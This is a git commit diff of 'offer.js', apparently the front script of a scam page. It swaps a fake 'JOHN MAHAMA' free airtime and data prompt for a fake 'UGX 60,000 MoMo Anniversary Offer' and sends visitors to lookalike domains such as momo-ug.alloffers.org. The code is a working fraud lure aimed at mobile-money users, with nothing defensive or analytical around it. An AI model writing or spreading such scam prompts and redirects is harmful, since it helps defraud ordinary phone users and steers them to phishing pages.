dfe2b1eb9755e6487358d45cb84b823655f785ef
kenycruzk <kenycruzk@gmail.com>
2025-04-23 02:55:49 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'UGX 60,000'
+password=prompt('SMS: Congratulations Your MoMo Account is Eligible to receive UGX 60,000 MoMo Anniversary Offer, Kindly Press OK to PROCEED ','UGX 60,000');
+if (password != 'UGX 60,000') {
+location.href='https://momo-ug.alloffers.org/gift';
 }
